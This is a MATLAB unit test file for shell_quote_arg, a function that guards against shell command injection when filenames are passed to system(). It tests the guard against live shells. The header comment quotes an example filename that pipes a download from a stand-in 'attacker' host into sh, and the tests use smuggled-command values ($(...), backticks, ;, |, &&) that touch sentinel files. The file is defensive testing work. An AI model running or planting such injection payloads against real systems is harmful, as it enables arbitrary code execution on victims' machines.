classdef (SharedTestFixtures = {prestus_paths}, TestTags = {'unit'}) test_shell_quote_arg < matlab.unittest.TestCase
% TEST_SHELL_QUOTE_ARG  Unit tests for shell_quote_arg (command-injection defense).
%
% Context: PRESTUS shells out to SimNIBS/pydeface/ANTs/BabelBrain/jwave via
% system(), which always routes the command string through a POSIX shell
% (or cmd.exe on Windows). Wrapping a value in literal double quotes
% ("%s") does NOT stop the shell from expanding $(...) / `...` / $VAR
% embedded in that value — a filename such as
%   ernie.msh.$(curl -s http://attacker:1337 | sh).msh
% scanned from an untrusted directory (e.g. a shared SimNIBS m2m/ folder,
% mirroring the BabelBrain PR #137/#139 report) would have the embedded
% command executed. shell_quote_arg() single-quotes the value instead,
% which POSIX shells never expand.
%
% These tests actually invoke the system shell (via MATLAB's system())
% to prove the quoting is effective against a live shell, not just that
% the string-escaping algorithm looks right on paper.
%
% Run with:   results = runtests('tests/test_shell_quote_arg.m');

    properties
        TmpDir = ''   % stays '' when setup skips the test (Windows)
    end

    methods (TestMethodSetup)
        function setup(tc)
            if ispc
                tc.assumeFail('shell_quote_arg POSIX-shell tests require a Unix shell.');
            end
            tc.TmpDir = tempname;
            mkdir(tc.TmpDir);
        end
    end

    methods (TestMethodTeardown)
        function cleanup(tc)
            if isfolder(tc.TmpDir)
                rmdir(tc.TmpDir, 's');
            end
        end
    end

    methods (Test, TestTags = {'security'})

        % ---- Roundtrip: the shell must see the quoted value as one --------
        % ---- literal argument, byte-for-byte equal to the input. ----------

        function test_roundtrip_plain_string(tc)
            tc.verifyRoundtrip('plain_filename.txt');
        end

        function test_roundtrip_spaces(tc)
            tc.verifyRoundtrip('a file with spaces.nii.gz');
        end

        function test_roundtrip_single_quote(tc)
            tc.verifyRoundtrip(char("it's a test.nii.gz"));
        end

        function test_roundtrip_double_quote(tc)
            tc.verifyRoundtrip(char('a"b.nii.gz'));
        end

        function test_roundtrip_mixed_quotes(tc)
            tc.verifyRoundtrip(char("a'b""c'd""e repeated quote soup"));
        end

        function test_roundtrip_backslash(tc)
            tc.verifyRoundtrip('a\b\\c.txt');
        end

        % ---- Injection payloads must reach the far side inert -------------

        function test_command_substitution_not_expanded(tc)
            % If $(...) were expanded, `out` would equal 'ernie.msh.INJECTED.msh'
            % (the echo output substituted in) instead of the literal payload.
            payload = 'ernie.msh.$(echo INJECTED).msh';
            out = tc.echoRoundtrip(payload);
            tc.verifyEqual(out, payload, ...
                '$(...) must not be expanded by the shell');
            tc.verifyNotEqual(out, 'ernie.msh.INJECTED.msh');
        end

        function test_backtick_substitution_not_expanded(tc)
            payload = 'file_`echo INJECTED`.nii.gz';
            out = tc.echoRoundtrip(payload);
            tc.verifyEqual(out, payload);
            tc.verifyNotEqual(out, 'file_INJECTED.nii.gz');
        end

        function test_semicolon_not_a_command_separator(tc)
            marker = fullfile(tc.TmpDir, 'pwned_semicolon');
            payload = sprintf('x.txt; touch %s', marker);
            out = tc.echoRoundtrip(payload);
            tc.verifyEqual(out, payload);
            tc.verifyFalse(isfile(marker), 'embedded ; must not run a second command');
        end

        function test_pipe_not_interpreted(tc)
            marker = fullfile(tc.TmpDir, 'pwned_pipe');
            payload = sprintf('x.txt | touch %s', marker);
            out = tc.echoRoundtrip(payload);
            tc.verifyEqual(out, payload);
            tc.verifyFalse(isfile(marker), 'embedded | must not run a second command');
        end

        function test_command_substitution_does_not_execute_side_effect(tc)
            % The canonical BabelBrain-report payload shape: a filename
            % that, if the shell expanded it, would run an arbitrary
            % command (here: create a sentinel file instead of curl|sh).
            marker = fullfile(tc.TmpDir, 'pwned_subshell');
            payload = sprintf('ernie.msh.$(touch %s).msh', marker);
            out = tc.echoRoundtrip(payload);
            tc.verifyEqual(out, payload);
            tc.verifyFalse(isfile(marker), ...
                '$(...) payload must not have been executed by the shell');
        end

        function test_ampersand_background_not_triggered(tc)
            marker = fullfile(tc.TmpDir, 'pwned_amp');
            payload = sprintf('x.txt && touch %s', marker);
            out = tc.echoRoundtrip(payload);
            tc.verifyEqual(out, payload);
            tc.verifyFalse(isfile(marker));
        end
    end

    methods
        function verifyRoundtrip(tc, payload)
            out = tc.printfRoundtrip(payload);
            tc.verifyEqual(out, payload);
        end

        function out = printfRoundtrip(tc, payload)
            cmd = sprintf('printf %%s %s', shell_quote_arg(payload));
            [status, out] = system(cmd);
            tc.verifyEqual(status, 0);
        end

        function out = echoRoundtrip(tc, payload)
            cmd = sprintf('echo %s', shell_quote_arg(payload));
            [status, out] = system(cmd);
            tc.verifyEqual(status, 0);
            out = strtrim(out);
        end
    end
end
